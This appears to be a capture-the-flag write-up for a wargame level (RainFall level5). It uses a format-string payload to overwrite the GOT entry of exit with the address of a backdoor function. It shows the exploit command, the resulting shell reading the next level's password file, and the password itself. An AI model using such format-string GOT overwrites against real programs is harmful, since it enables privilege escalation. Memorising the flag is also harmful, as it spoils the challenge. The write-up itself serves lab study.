The difference, here, is that there is a backdoor. So we just need to make execute put the address of the function `o` (0x080484a4) where the stack will read.
So, we could put it in the call of `exit`. In the function `exit`, we have this line :

>   0x080483d0 <+0>:	jmp    *0x8049838

And we got :

>(gdb) disas 0x8049838
>Dump of assembler code for function exit@got.plt:
>0x08049838 <+0>:	(bad)  
>0x08049839 <+1>:	addl   $0xffffffe6,(%eax,%ecx,1)

So we can put the address of `o` right there : `0x08049838`

>level5@RainFall:~$ cat <(python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"') - | ./level5
>whoami
>level6
>cat /home/user/level6/.pass
>d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

```bash
su level6
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

